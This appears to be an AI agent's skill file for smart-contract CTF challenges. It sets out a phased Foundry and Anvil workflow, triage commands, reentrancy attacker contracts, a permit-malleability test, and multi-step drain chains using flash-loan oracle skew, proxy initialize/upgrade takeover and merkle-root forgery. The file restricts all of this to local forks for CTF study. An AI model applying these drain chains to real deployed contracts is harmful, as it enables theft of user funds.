---
name: blockchain
description: Smart-contract CTF triage to exploit via foundry, EVM sinks, and DeFi logic bugs
category: blockchain
phase: 1-3
---
Execution policy: follow `skills/_shared/SKILL_CONTRACT.md`; separate evidence from inference, preserve scope, validate each link, and label uncertainty.

# Blockchain / Smart-Contract Skill

## Mental Model

Contract CTFs (Paradigm CTF / Damn Vulnerable DeFi style) are logic puzzles
with money semantics. The chain is deterministic: same calldata + same state
= same result. Your job is to find a state transition the author did not
intend, then drive it with a Foundry test.

Think in three layers: **EVM mechanics** (`msg.sender` vs `tx.origin`,
calldata, storage layout, `delegatecall` context, `selfdestruct`
force-send); **Solidity logic** (reentrancy, unchecked returns, missing
access control, oracles, predictable randomness); **DeFi composition**
(flash loans, AMM curves, proxies) where price moves inside one tx.

Hypothesis order: access control → value-flow → external-call handling →
delegatecall/proxy → oracle/flash-loan/randomness. Read contracts, write
one attacker contract, run `forge test -vvv`.

Scope guard: technique-only, local Anvil/fork only. Never mainnet, never
real funds, no real flags. One exploit transaction path per gate.

## Workflow

### Phase 1 — Baseline (read contracts + map sinks, ≤120s)

Goal: inventory contracts, entry points, and value sinks without executing.

Steps:

1. List `src/ test/ script/ foundry.toml` + README win condition
   ("drain the vault", "become owner"). Record pragma (pre-0.8 overflow?),
   imports (AMM? oracle?), proxy presence.
2. List external/public functions; mark payable + fund-movers
   (`call/transfer/mint/withdraw/claim/swap`) with their auth
   (`onlyOwner`, `tx.origin`, none) and price/randomness sources.
3. Save sink list to `results/bc_<id>/sinks.txt`.

```bash
ls -R src/ test/ script/ 2>/dev/null; cat foundry.toml 2>/dev/null
grep -rhn 'pragma solidity' src/ | head -n 10
grep -rhn 'function ' src/ | head -n 40
grep -rHn 'call{\|delegatecall\|selfdestruct\|mint(\|withdraw\|claim\|swap' src/ | head -n 30
grep -rHn 'onlyOwner\|tx.origin' src/ | head -n 20
grep -rHn 'block.timestamp\|reserve\|price\|oracle' src/ | head -n 20
forge build 2>&1 | head -n 20
slither src/ --solc solc 2>&1 | head -n 60
```

`Reasoning Checkpoint`: contract list + sink list + win condition →
ranked vuln hypotheses (access-control first) → next phase target.

### Phase 2 — Confirmation (prove the sink is reachable, no funds moved)

Goal: confirm one hypothesis with read-only calls + storage reads on a
local fork or Anvil instance.

Steps:

1. Start Anvil (fork if mainnet state needed).
2. `cast call` views: balances, owner, price, reserves.
3. Read proxy slots (EIP-1967) → real implementation; `cast storage` for
   the slot you plan to manipulate.
4. Dry-run preconditions in `forge test -vvv` before exploit logic.

```bash
anvil --fork-url $RPC_URL --fork-block-number $BLOCK 2>&1 | head -n 10
cast call $VAULT "balance()" --rpc-url http://127.0.0.1:8545
cast call $TOKEN "balanceOf(address)(uint256)" $VAULT --rpc-url http://127.0.0.1:8545
cast call $VAULT "owner()(address)" --rpc-url http://127.0.0.1:8545
cast implementation --rpc-url http://127.0.0.1:8545 $PROXY
cast admin --rpc-url http://127.0.0.1:8545 $PROXY
cast --to-wei 1 ether
forge test --match-test test_Preconditions -vvv 2>&1 | head -n 40
```

EIP-1967 reference slots (verify with `cast implementation`/`cast admin`
rather than trusting memory):

```text
implementation: 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
admin:          0xb53127684a568b3173ae13b9c1b671b1c70444234c46f7c253b096191a5ed6b7
beacon:         0xa3f0ad74e5423aebf56d84a837638b9a52c15a59510d5f229aaa5a2b6e9e32
```

`Reasoning Checkpoint`: read-only evidence (balances, owner, impl address,
slot values) confirms the sink is live → one exploit hypothesis into
negative testing.

### Phase 3 — Negative (kill false positives before writing the attacker)

Goal: explicitly rule out the hypotheses that waste the most time.

Checks:

1. **Reentrancy real?** State updated BEFORE the call + guard present →
   plain reentrancy dead; look at read-only/cross-function.
2. **Overflow real?** `>=0.8.0` without `unchecked {}` reverts; pre-0.8
   or `unchecked` keeps it alive.
3. **Randomness committed?** Commit-reveal/VRF → dead; raw
   `block.timestamp` → alive. **Oracle TWAP?** Multi-block median →
   one-tx pump likely dead.
4. **Proxy upgradeable by you?** Timelocked admin ≠ open `upgradeTo`.

```bash
grep -rHn -A5 '\.call{' src/ | head -n 40
grep -rHn 'unchecked\|nonReentrant\|ReentrancyGuard\|upgradeTo\|UUPS' src/ | head -n 20
cast call $VAULT "getReserves()(uint112,uint112,uint32)" --rpc-url http://127.0.0.1:8545
```

`Reasoning Checkpoint`: dead hypotheses with one-line evidence each →
single live hypothesis (e.g. "tx.origin auth + phishing path" or
"spot-price oracle + flash-loan pump") into gated exploit.

### Phase 4 — Exploit (GATED: one Foundry PoC step, ≤120s per run)

Gate: one attacker contract + one test, run once with `forge test -vvv`,
evaluate, then stop. Never parallelize live-service interaction; local
Anvil only.

Loop: write `.t.sol` attacker → `forge test -vvv` → read trace → fix OR
pivot (1 corrected retry → 1 alternate method → `blocked`).

```bash
forge test --match-test test_Exploit -vvv 2>&1 | tail -n 50
forge test --match-test test_Exploit -vvvv 2>&1 | tail -n 60
```

Minimal attacker test shape:

```solidity
// test/Exploit.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/Vault.sol";
contract ExploitTest is Test {
    Vault vault;
    address attacker = address(0x1337);
    function setUp() public {
        vault = new Vault();
        vm.deal(attacker, 10 ether);
        vm.deal(address(vault), 100 ether);
    }
    function test_Exploit() public {
        vm.startPrank(attacker);
        // ONE exploit path here
        vm.stopPrank();
        assertTrue(address(vault).balance == 0, "vault not drained");
    }
}
```

Run + iterate:

```bash
forge test --match-test test_Exploit -vvv 2>&1 | tail -n 60
```

`cast send` variant (only against local Anvil, never mainnet):

```bash
cast send $VAULT "withdraw(uint256)" 100 --private-key $ANVIL_KEY --rpc-url http://127.0.0.1:8545
cast call $VAULT "balance()" --rpc-url http://127.0.0.1:8545
```

`Reasoning Checkpoint`: trace output + post-state (balance/owner/flag
emitted) → verdict (win condition met → validation; else retry/alternate/
blocked).

### Phase 5 — Validation-handoff (prove win condition, package PoC)

Goal: deterministic re-run + handoff bundle.

Steps:

1. Re-run `forge test --match-test test_Exploit -vvv` twice; both pass.
2. Assert the challenge's win condition explicitly (`isSolved`, owner
   check, balance check — copy the challenge's own checker).
3. Save: attacker contract, test file, Anvil fork block (if any),
   `forge build` output, trace log.
4. Never paste real flags/keys into hosted models.

Commands:

```bash
forge test --match-test test_Exploit -vvv 2>&1 | tail -n 20
forge test 2>&1 | tail -n 10
cast call $CHALLENGE "isSolved()(bool)" --rpc-url http://127.0.0.1:8545
cp test/Exploit.t.sol results/bc_exploit.t.sol
forge build > results/bc_build.txt 2>&1
python3 -c "import json; json.load(open('state.json')); print('state ok')"
```

`Reasoning Checkpoint`: win-condition proof + file list → handoff
(PoC path + fork info + next step if chained).

## Tool Table (exact copy-paste commands)

| Task | Command |
|---|---|
| Init project | `forge init --no-git myctf` |
| Build | `forge build` |
| Run all tests | `forge test` |
| Run one test verbose | `forge test --match-test test_Exploit -vvv` |
| Full traces | `forge test --match-test test_Exploit -vvvv` |
| Match contract | `forge test --match-contract ExploitTest` |
| Start Anvil | `anvil` |
| Fork Anvil | `anvil --fork-url $RPC_URL --fork-block-number $BLOCK` |
| Read-only call | `cast call $TOKEN "balanceOf(address)(uint256)" $ADDR --rpc-url http://127.0.0.1:8545` |
| State-changing send (local only) | `cast send $VAULT "withdraw(uint256)" 100 --private-key $KEY --rpc-url http://127.0.0.1:8545` |
| Storage slot | `cast storage $CONTRACT 0 --rpc-url http://127.0.0.1:8545` |
| EIP-1967 impl | `cast implementation --rpc-url http://127.0.0.1:8545 $PROXY` |
| EIP-1967 admin | `cast admin --rpc-url http://127.0.0.1:8545 $PROXY` |
| Mapping slot | `cast index address $KEY $SLOT` |
| Keccak | `cast keccak "some.string"` |
| Unit convert | `cast --to-wei 1 ether` / `cast --from-wei 1000000000000000000` |
| Sig selector | `cast sig "transfer(address,uint256)"` |
| Calldata encode | `cast calldata "transfer(address,uint256)" $TO 100` |
| 4byte lookup | `cast 4byte 0xa9059cbb` |
| Balance | `cast balance $ADDR --rpc-url http://127.0.0.1:8545` |
| Block number | `cast block-number --rpc-url http://127.0.0.1:8545` |
| Impersonate (anvil) | `cast rpc anvil_impersonateAccount $ADDR` |
| Mine blocks | `cast rpc anvil_mine 10` |
| Slither scan | `slither src/ --solc solc` |
| Slither summary | `slither src/ --print human-summary` |
| Selectors in bytecode | `cast selectors $BYTECODE` |

Cheatcodes used in PoCs: `vm.prank(addr)`, `vm.startPrank/stopPrank`,
`vm.deal(addr, amt)`, `vm.warp(ts)`, `vm.roll(block)`,
`vm.store(target, slot, value)`, `vm.expectRevert(...)`.

## Code / Payload Library

### 1. Reentrancy (victim calls out before updating state)

Victim shape:

```solidity
function withdraw() external {
    uint256 bal = balances[msg.sender];
    (bool ok, ) = msg.sender.call{value: bal}(""); // state update AFTER call = bug
    require(ok);
    balances[msg.sender] = 0;
}
```

Attacker sketch:

```solidity
contract Reenter {
    Vault v;
    constructor(address _v) { v = Vault(_v); }
    function pwn() external payable { v.deposit{value: 1 ether}(); v.withdraw(); }
    receive() external payable { if (address(v).balance >= 1 ether) v.withdraw(); }
}
```

### 2. tx.origin auth (phishable)

```solidity
require(tx.origin == owner); // VULN: owner tricked into calling attacker
                             // contract keeps tx.origin == owner. Use msg.sender.
```

### 3. Integer over/underflow (pre-0.8 or `unchecked`)

Pre-0.8 `balances[msg.sender] -= amt` wraps when `amt > balance`; on
0.8+ only inside `unchecked {}`. PoC: `amt = balance + 1`, assert huge
balance. Check pragma first.

### 4. Unchecked call return value

```solidity
token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amt)); // return ignored
```

A `false`-returning (non-reverting) token leaves victim state advanced
with no payment. PoC with a failing-token mock.

### 5. Delegatecall injection + storage collision

```solidity
proxy.delegatecall(data); // VULN: attacker data runs in VICTIM storage context
```

PoC: calldata into victim's own `setOwner(address)` via the fallback.
Twin: proxy admin slot aliases logic-contract variable (same slot,
different layout) — confirm with `cast storage` on both, then
`vm.store(logic, bytes32(uint256(0)), bytes32(uint256(1)))` to test.

### 6. Missing access control (`onlyOwner` absent)

```solidity
function setOwner(address o) external { owner = o; } // no modifier = bug
function mint(address to, uint256 amt) external { _mint(to, amt); }
```

PoC: `cast send $V "setOwner(address)" $ATTACKER --private-key $KEY`
then privileged action. Grep first: functions WITHOUT modifiers that
write `owner/paused/minter/balances`.

### 7. Price-oracle manipulation + flash-loan loop

```solidity
uint256 price = token.balanceOf(pool) * 1e18 / eth.balanceOf(pool); // spot read = VULN
```

Single-tx loop in an attacker contract: flash-loan → skew reserves →
victim reads manipulated price → borrow/mint at discount → restore →
repay. Confirm spot (not TWAP) in Phase 3. Flash callback shape:

```solidity
function onFlashLoan(uint256 amt, uint256 fee, bytes calldata) external returns (bytes32) {
    // manipulate victim here, then approve repayment
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

### 8. Predictable randomness + proxy reading

```solidity
uint256 win = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 100; // VULN
```

PoC: compute the same expression in the attacker in the same block and
play only winning rounds (or `vm.warp` to one). Dead if commit-reveal/VRF.

```bash
cast implementation --rpc-url $RPC $PROXY
cast admin --rpc-url $RPC $PROXY
cast storage $PROXY 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $RPC
```

## Decision Tree

```text
functions without modifiers writing owner/balances/paused?
  YES -> access-control PoC first (cheapest win)
external call before state update + no ReentrancyGuard?
  YES -> reentrancy attacker contract
tx.origin used for auth?
  YES -> phishing-path PoC (owner calls attacker)
delegatecall with attacker-influenced data/target?
  YES -> selector-injection / setOwner-via-fallback PoC
unchecked low-level call return?
  YES -> failing-token mock PoC
pragma <0.8 or unchecked block on arithmetic?
  YES -> overflow/underflow PoC
price from spot reserves single-tx read?
  YES -> flash-loan pump PoC (else check TWAP -> likely dead)
randomness from block.timestamp/number/hash?
  YES -> same-block predictor PoC (else VRF/commit -> dead)
proxy present?
  -> read EIP-1967 slots -> impl logic review -> collision/upgrade PoC
none of above -> read test/ + script/ win checker again (misread likely)
```

## AI Automation Notes

- Worker loop: read contracts → sink list → ONE foundry PoC →
  `forge test -vvv` → trace diff → fix/pivot. Cap: 3 PoC iterations, then
  `blocked` + handoff of sink list.
- One worker per challenge instance (shared Anvil nonce/state; never
  parallelize sends to the same chain).
- Template matrix: `{reenter, txorigin-phish, overflow, unchecked-call,
  delegatecall, missing-owner, oracle-pump, flash-callback, rand-predict,
  storage-collision}` × `{forge test trace, cast call pre/post}`. Log
  which rows were tried with the revert reason.
- Auto-triage snippet:

```bash
grep -rHn 'tx.origin' src/ && echo HYP=txorigin
grep -rHn -B2 -A6 '\.call{' src/ | grep -q 'balances\[.*\] = 0' && echo HYP=reentrancy-candidate
grep -rHn 'delegatecall' src/ && echo HYP=delegatecall
grep -rHn 'block.timestamp\|blockhash' src/ && echo HYP=randomness
grep -rHn 'getReserves\|balanceOf.*pool\|price' src/ && echo HYP=oracle
```

- Unique artifacts: `results/bc_<chalid>/Exploit.t.sol` + trace log.
- Solana/Rust note (brief): Anchor programs (`programs/`), `Anchor.toml`,
  `lib.rs` with `#[program]`; common CTF bugs mirror EVM — missing signer
  check (`ctx.accounts.owner` unconstrained), missing account-owner check,
  integer logic in `#[account]` math. Triage with `cargo test` /
  `anchor test`; exploit with a TS/Rust client calling the instruction
  with spoofed accounts. Keep to triage + sink list; deep Solana exploits
  use the same gated loop (one client PoC per gate).
- OPSEC: local Anvil/fork only; never paste real RPC keys, mnemonics, or
  flags into hosted models.

## Advanced / Hard-Challenge Playbook

Use this playbook only after Phase 3 leaves one live hypothesis that
resists a single-function PoC. Hard challenges hide the bug across
functions, contracts, blocks, or upgrades. Work top-down: variant
identification → minimal state-diff proof → full chain.

### A1. Reentrancy variants (beyond single-function call-before-update)

Classic check (Phase 3) misses shared-state reentrancy. Triage all three:

1. **Cross-function:** `withdraw()` guarded but sibling `transfer()` /
   `claimRewards()` / `borrow()` shares `balances[]` unguarded. Reenter the
   sibling, not the same fn. Detect: `grep nonReentrant` vs full externals.
2. **Cross-contract:** Vault A calls Token B hook (`tokensReceived`,
   `onERC721Received`, `uniswapV2Call`, `onFlashLoan`). B calls back into
   A or paired C sharing price state. Detect via hook-name grep below.
3. **Read-only:** `view` (`getPrice`, `get_virtual_price`, `exchangeRate`)
   returns stale mid-update state; downstream lender acts on it. Guards
   rarely cover `view`. Confirm: log view before vs inside callback.

Attacker skeleton (sibling reentry via hook):

```solidity
contract HookReenter {
    IVault v; bool entered;
    constructor(address _v) { v = IVault(_v); }
    function pwn() external payable {
        v.deposit{value: 1 ether}(); v.withdraw(1 ether);
    }
    function tokensReceived(address,address,address,uint256,bytes calldata,bytes calldata) external {
        if (!entered) { entered = true; v.claimRewards(); }
    }
    receive() external payable {
        if (!entered && address(v).balance >= 1 ether) { entered = true; v.withdraw(1 ether); }
    }
}
```

`Reasoning Checkpoint`: hook inventory + guard diff + stale-view pair → variant label.

### A2. Flash-loan + AMM price math (`x * y = k` manipulation steps)

Hard DeFi = multi-call skew in one tx. Compute amounts, do not guess.
Uniswap-V2 style (`997/1000` fee): `out = (in*997/1000*y)/(x+in*997/1000)`,
`newX=x+in`, `newY=k/newX`, `spot=x/y`.

Manipulation steps (local Anvil only):

1. Read `getReserves()` + victim price fn; record `x0,y0,p0`.
2. Flash-borrow `L ≈ x0/2`; swap token0→token1; log skew `p1/p0`.
3. While skewed call `borrow(max)` / `mint` / `liquidate`; victim reads `p1`.
4. Swap back, repay `L` + fee; require profit `> fee + gas` (else shrink `L` 25%, retry once).
5. TWAP/median victim → single-tx skew dead by design → two-block `warp+roll` path.

Triage commands:

```bash
grep -rHn 'getReserves\|getSpotPrice\|getExchangeRate\|pricePerShare\|TWAP\|observe\|skim\|sync' src/ | head -n 30
cast call $PAIR "getReserves()(uint112,uint112,uint32)" --rpc-url http://127.0.0.1:8545
cast call $VICTIM "getExchangeRate()(uint256)" --rpc-url http://127.0.0.1:8545
```

`Reasoning Checkpoint`: reserves + price-fn source (spot vs TWAP) +
skew factor from dry-run → flash-viable or dead.

### A3. ERC-2612 permit signature malleability (`v` 27/28, `s` flip)

`permit(owner, spender, value, deadline, v, r, s)` via `ecrecover`:

1. **Malleability:** `ecrecover` accepts `(r,s)` and `(r,n-s)` with flipped
   `v` (27↔28). If replay-key = `keccak(sig)` instead of nonce, twin passes.
   OZ `ECDSA.tryRecover` rejects high-`s`; custom `ecrecover` often does not.
   Detect: custom `ecrecover` without low-`s` check = alive.
2. **Replay/domain:** missing `nonces++`, static `DOMAIN_SEPARATOR`
   (no `chainId`/`address(this)`), missing `deadline` or
   `owner != address(0)` check. Detect: read `permit()` body for all four.

Foundry check (technique-only): submit `(v,r,s)` then twin
`(v^1, r, n-s)`; fixed code reverts second, buggy code accepts.

```solidity
function test_PermitMalleable() public {
    uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    bytes32 sTwin = bytes32(n - uint256(s));
    uint8 vTwin = v == 27 ? 28 : 27;
    token.permit(owner, spender, value, deadline, v, r, s);
    vm.expectRevert();
    token.permit(owner, spender, value, deadline, vTwin, r, sTwin);
}
```

`Reasoning Checkpoint`: nonce/deadline/domain/low-s + twin result → verdict.

### A4. Upgradeable-proxy traps (UUPS / Transparent / beacon)

Never hardcode EIP-1967 slots in exploits; always resolve via `cast`.

```bash
cast implementation --rpc-url http://127.0.0.1:8545 $PROXY
cast admin --rpc-url http://127.0.0.1:8545 $PROXY
cast storage $PROXY 0 --rpc-url http://127.0.0.1:8545
cast selectors $IMPL_BYTECODE
grep -rHn 'upgradeTo\|_authorizeUpgrade\|UUPS\|Transparent\|Beacon\|initialize\|_disableInitializers\|onlyProxy' src/ | head -n 30
```

Trap matrix (resolve slots via `cast`, never hardcoded hex):

| Trap | Detect | PoC |
|---|---|---|
| Unprotected `initialize` re-run (no `_disableInitializers`, split deploy+init txs) | constructor lacks it; deploy script passes empty `data` | `cast send $PROXY "initialize(address)" $ATTACKER` |
| UUPS `upgradeTo` open (missing `onlyProxy` / `_authorizeUpgrade`) | authorize fn empty; impl directly callable | upgrade to drain-impl via impl address |
| Transparent admin / storage collision (slot 0 alias) | `cast admin` holder you control; `cast storage` diff | `vm.store` round-trip, setter→admin read |
| Beacon impl swap (one beacon feeds many proxies) | beacon slot read + beacon `upgradeTo` present | compromise beacon, drain all |
| Impl-slot misread | `cast storage` ≠ `cast implementation` | re-derive per RPC |

`Reasoning Checkpoint`: proxy kind + impl/admin via cast + init reachability → trap/dead.

### A5. Merkle-proof verification bugs

`withdraw(recipient, amount, proof)` + `verify(leaf, proof, root)` gates:

1. **Single-leaf bypass:** empty `proof` accepted when `leaf == root`;
   forge leaf then register `root = leaf` via open `bondRoot`.
2. **Leaf malleability:** `keccak(addr, amount)` without index/domain;
   swap ordering or reuse sibling proof.
3. **Root injection:** `bondTransferRoot/setRoot` without balance check
   (pairs with timelock-zero trick A8).
4. **Hash confusion:** `keccak(a,b)` vs `keccak(b,a)`,
   `encodePacked` vs `encode` mismatch.

PoC: single-leaf tree (`totalLeaves=1`, `siblings=[]`) + `withdraw`;
copy challenge `verify` verbatim. Grep:
`MerkleProof|verify|bondTransferRoot|totalLeaves`.

`Reasoning Checkpoint`: verify source + leaf encoding + root auth → bypass/dead.

### A6. `tx.origin` vs `msg.sender`, rounding/dust, timelock, CREATE2

- **`tx.origin` phish:** `require(tx.origin == owner)` passes when owner
  is tricked into calling attacker (`owner→Attacker.pwn()→Victim.priv`).
  Foundry: `vm.prank(owner)` on attacker entry. Dead if `msg.sender` used.
- **Rounding/dust:** `a/b*c` truncation, thin-liquidity share math,
  zero-fee dust loops. PoC: 50–200 dust iterations, assert monotonic gain.
- **Governance/timelock:** `setChallengePeriod(0)` / `setDelay(0)` skips
  loops; flash-funded snapshot votes repaid same tx. Test with
  `vm.warp(ts+delay+1); vm.roll(n+1)`. Grep: `timelock|challengePeriod|snapshot`.
- **CREATE2 redeploy:** deterministic `salt` addr + `selfdestruct` →
  same-address code swap. Check ancestry (factory may be CREATE2 even if
  target is CREATE). Emulate with `vm.etch`; never assume addr ⇒ code.

`Reasoning Checkpoint`: auth + rounding gain + timelock params + CREATE2 ancestry → ranked hypothesis.

## Multi-Step Chains (abstract patterns, technique-only)

Hard wins are chains, not single calls. Each chain below is one gated
exploit run: write ONE `Exploit.t.sol` covering all hops, assert final
win condition only.

### Chain 1 — Flash-loan → oracle skew → drain (lending + AMM)

```text
PREREQ: victim borrows against spot price from AMM pair; flash pool available.
1. Snapshot: record pair reserves (x0,y0), victim collateral factor, your collateral.
2. Flash-borrow L (≈ 30–50% of x0). In callback:
   a. swap L to skew price p0 → p1 (log skew).
   b. call victim.borrow(maxForYourCollateralAtP1) — inflated by p1.
   c. optional: victim2 reads same skewed view (read-only reentrancy shape).
3. Swap back to restore reserves (minimize slippage loss).
4. Repay L + fee from borrowed funds; keep remainder.
5. Assert victim balance dropped / isSolved true.
PIVOT: if TWAP → abort to two-block warp chain; if fee > profit → shrink L.
```

Foundry shape: implement `onFlashLoan` / `uniswapV2Call` in attacker;
all five steps inside callback; single `forge test -vvv` run.

### Chain 2 — Proxy → impl read → unprotected init → upgrade/drain

```text
PREREQ: proxy at P, impl at I via `cast implementation`.
1. Read I bytecode selectors; find initialize(address) / upgradeTo(address).
2. Try initialize on P (front-run shape) then on I directly:
   cast send P "initialize(address)" ATTACKER ; cast send I "initialize(address)" ATTACKER
3. If owner captured: call privileged fn (mint/setRoot/upgradeTo).
4. If UUPS upgrade open: deploy Malicious impl (drain fn), upgradeTo(Malicious), drain.
5. Assert owner == attacker && balance == 0.
PIVOT: if initializer locked (_disableInitializers present) → storage-collision path.
```

### Chain 3 — Governance-zero + Merkle-root forge → withdraw

```text
PREREQ: bridge/vault with bondRoot + merkle withdraw + challengePeriod setter.
1. As governance (prank), setChallengePeriod(0) → accounting loop skipped.
2. Craft single-leaf tree: leaf = keccak(recipient, amount==fullBalance), root = leaf.
3. bondTransferRoot(root, amount) passes balance check.
4. withdraw(recipient, amount, proof=[]) verifies (leaf==root, no siblings).
5. Assert drained / isSolved.
PIVOT: if root setter guarded → flash-vote snapshot path (A8).
```

`Reasoning Checkpoint`: chain preconditions (reserves/impl/root-setter)
+ single-trace proof → chain verdict (drained / blocked with revert
pc) → validation-handoff or alternate chain (max 1 retry + 1 alternate).

## Failure-Mode Catalog + Recovery

Log every failure with revert string + pc. Never retry blindly.

| # | Failure (symptom) | Detection | Recovery (one step) |
|---|---|---|---|
| F1 | Anvil fork drift (price/reserves differ from challenge snapshot) | `cast block-number` ≠ pinned block; `getReserves` mismatch vs baseline | Pin block: `anvil --fork-url $RPC --fork-block-number $BLOCK`; record block in artifacts; re-run preconditions |
| F2 | `vm.prank` vs `deal` confusion (balance right, auth wrong or vice versa) | `msg.sender` correct but `balance==0`, or balance funded but `onlyOwner` reverts | `deal` funds value, `prank` spoofs caller — use both: `vm.deal(attacker,10 ether); vm.startPrank(attacker);` assert `msg.sender` in trace |
| F3 | Gas griefing in test (callback runs out of gas, misleading revert) | `-vvv` shows `out of gas` inside hook/callback, top-level looks like logic revert | Set explicit gas: `v.withdraw{gas: 500000}()`; raise `anvil --gas-limit`; isolate callback in own test |
| F4 | Oracle needs 2-block skew (single-tx pump reverts / TWAP unchanged) | Price fn reads `observe TWAP`, `blockNumberLast`, or median; `p1==p0` after skew | `vm.warp(ts+Δ); vm.roll(n+1);` skew leg 1, warp/roll, skew leg 2, then victim call; assert TWAP moved |
| F5 | Permit replay fails (nonce already consumed) | Second `permit` reverts `invalid nonce` / `expired` | Read `nonces(owner)` before/after; sign fresh digest per nonce (`vm.sign` with current nonce + deadline); never reuse `(v,r,s)` across tests |
| F6 | Proxy slot misread (hardcoded hex stale / wrong chain) | `cast storage` value ≠ `cast implementation` result | Always `cast implementation/admin $PROXY`; never trust pasted slot hex; re-derive per RPC |
| F7 | ERC-777 / hook reentry silently skipped (no callback fired) | Trace shows plain `transfer`, no `tokensReceived` frame | Register hook (`ERC1820Registry.setInterfaceImplementer`) or use ERC-777 token; assert callback frame in `-vvvv` |

Triage snippet for F-class:

```bash
cast block-number --rpc-url http://127.0.0.1:8545
cast call $TOKEN "nonces(address)(uint256)" $OWNER --rpc-url http://127.0.0.1:8545
forge test --match-test test_Exploit -vvvv 2>&1 | grep -E 'Revert|out of gas|nonce|TWAP|blockNumber' | head -n 20
```

`Reasoning Checkpoint`: revert string + failing frame (F1–F7 label) →
prescribed single recovery → re-run once; second failure → alternate
method; third → `blocked`.

## Version-Drift Guards

Foundry / cast / solc drift silently breaks PoCs. Guard every run:

- **Pinned toolchain:** record `forge --version`, `cast --version`,
  `solc --version` in `results/bc_<id>/versions.txt`. If challenge pins
  `foundry.toml [profile]` solc (`pragma ^0.7.0` vs `^0.8.20`), use that
  solc; pre-0.8 overflow PoCs die on 0.8+ and vice versa.
- **Flag drift:** `cast` subcommands rename across releases
  (`cast implementation` vs manual `cast storage`). Prefer long-form
  `cast call/send/storage/block-number`; test one read-only `cast call`
  after any toolchain bump before exploit runs. `forge test -vvv`
  vs `-vvvv` verbosity flags stable — default to `-vvv`, escalate once.
- **Pragma gate:** `grep -rhn 'pragma solidity' src/` first. `unchecked`,
  `SafeMath`, `ReentrancyGuard` availability differ by minor version.
  Do not import OZ v5 into a 0.7.x project to "fix" triage — match.
- **EIP-1967 rule:** always resolve impl/admin/beacon via
  `cast implementation` / `cast admin` (and beacon storage read);
  pasted slot hex in notes is reference only. Re-read per RPC endpoint.

```bash
forge --version; cast --version; solc --version
cat foundry.toml | head -n 20
grep -rhn 'pragma solidity' src/ | head -n 10
cast implementation --rpc-url http://127.0.0.1:8545 $PROXY
cast admin --rpc-url http://127.0.0.1:8545 $PROXY
```

`Reasoning Checkpoint`: versions + pragma + cast-probe success →
toolchain trusted or pinned-fix.

## Time-Budget Tiers

Stop rules prevent sink-costing on hard targets. Timers start at sink
list done.

- **Easy (≤20 min):** access-control / `tx.origin` / missing-owner /
  plain reentrancy. Stop: 2 PoC iterations or one clean negative →
  pivot to next sink, then `blocked` with handoff.
- **Medium (≤1 h):** overflow, unchecked-return, delegatecall-inject,
  spot-oracle pump, predictable randomness. Stop: 3 PoC iterations
  (1 fix + 1 alternate + 1 polish) → `blocked` if `isSolved` false.
- **Hard (≤3 h):** cross-function/cross-contract/read-only reentrancy,
  flash + AMM math, UUPS/beacon traps, permit malleability, merkle
  bypass, CREATE2. Stop per chain: 1 chain attempt + 1 corrected retry
  + 1 alternate chain → `blocked`; mandatory Failure-Catalog labels.
- **Insane (escalate):** multi-protocol composition, custom crypto in
  precompiles, governance + timelock + bridge chained. Cap personal work
  at 3 h; at 90 min with no live hypothesis → escalate (see below).
  Never extend by brute force (fuzz caps: ≤3 seeds × ≤120 s each).

Always log: start-ts, tier, iterations used, revert set, next trigger.

`Reasoning Checkpoint`: elapsed vs tier cap + live-hypothesis status →
continue / pivot / escalate / blocked.

## Escalation Triggers

Escalate with evidence bundle (sink list + traces + F-labels), not prose.

- **To `/rev` (off-chain bot / binary in scope):** challenge ships a
  solver bot, keeper binary, or `script/` JS that signs permits /
  drives oracle updates. Trigger: price moves only via off-chain cron,
  or signature must come from bot key. Handoff: bot entrypoint + sample
  invocation + RPC it talks to.
- **To chaining-flagpath (multi-contract path):** win needs ordered hops
  across ≥2 contracts (flash→skew→borrow→re-deposit, or
  init→upgrade→drain). Trigger: single-contract PoC passes locally but
  `isSolved` needs second contract state change. Handoff: ordered
  contract path + per-hop pre/post balances.
- **To operator (mainnet-fork RPC gate):** fork URL / block / API key
  missing, rate-limited, or mainnet state required (real reserves,
  ENS, Chainlink feed). Trigger: `anvil --fork-url` fails 401/429, or
  reserves diverge without pinned block. Use `tools/operator_ping.sh`
  need string; keep solving fork-independent work meanwhile. Never paste
  keys/flags; request scoped RPC only.

`Reasoning Checkpoint`: trigger condition + bundle completeness →
escalated (with ticket) or continue solo.

## Worked End-to-End Example (abstract generic vault, technique-only)

No real flags, no real addresses. Generic `Vault` with spot-price mint:

```solidity
// VICTIM (abstract): spot price + single guard, sibling fn unguarded
contract GenericVault {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public shares;
    IPool public pool; // x*y=k AMM
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw(uint256 a) external nonReentrant {
        uint256 b = balances[msg.sender]; require(b >= a);
        (bool ok,) = msg.sender.call{value: a}(""); require(ok);
        balances[msg.sender] = b - a; // sibling below shares state, unguarded
    }
    function claimRewards() external { /* reads shares, sends rewards, no guard */ }
    function mintShares(uint256 amt) external {
        uint256 price = pool.getSpotPrice(); // spot read = skewable
        shares[msg.sender] += amt * 1e18 / price;
    }
}
```

Exploit plan (one `Exploit.t.sol`, local Anvil):

1. **Baseline (≤120 s):** sinks = `withdraw` (call-before-update
   guarded), `claimRewards` (unguarded sibling), `mintShares`
   (spot price). Negative kills plain overflow (pragma 0.8.x, no
   `unchecked`) and TWAP (none — spot confirmed).
2. **Confirm:** `cast call` balances/reserves/price; `cast storage`
   share slot; dry-run skew math: `L = x0/3`, compute `p1/p0 ≈ 2.1×`.
3. **Chain:** flash-borrow `L` → skew `p0→p1` → `mintShares` at `p1`
   (excess shares) → unwind + repay → `withdraw` + `claimRewards`
   cross-function reentry via `receive()` hook for second harvest.
4. **Validate:** re-run twice, assert `isSolved`-style
   (`vaultBalance == 0 || sharesValue >= threshold`), save test +
   trace + fork block.

```solidity
// test/Exploit.t.sol (abstract shape)
contract ExploitTest is Test {
    GenericVault vault; IPool pool; FlashPool flash;
    address attacker = address(0x1337);
    function setUp() public {
